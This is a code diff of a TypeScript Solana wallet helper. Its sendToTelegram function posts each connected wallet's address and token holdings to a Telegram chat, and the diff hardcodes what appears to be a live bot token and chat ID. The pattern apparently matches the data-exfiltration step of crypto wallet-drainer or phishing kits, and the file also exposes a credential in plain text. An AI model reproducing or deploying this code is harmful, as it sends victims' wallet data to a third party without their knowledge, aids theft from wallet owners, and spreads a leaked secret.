@@ -1,8 +1,8 @@
 import { Connection, PublicKey } from '@solana/web3.js';
 
 // WARNING: Storing credentials in code is not secure
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
+const TELEGRAM_CHAT_ID = "-1002490122517";
 
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
   try {
@@ -24,13 +24,13 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
 
 export const sendToTelegram = async (walletData: any) => {
   try {
-    const response = await fetch(`https://api.telegram.org/bot${7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: -1002490122517,
+        chat_id: TELEGRAM_CHAT_ID,
         text: `New Wallet Connected:\nAddress: ${walletData.address}\nTokens: ${JSON.stringify(walletData.tokens, null, 2)}`,
       }),
     });
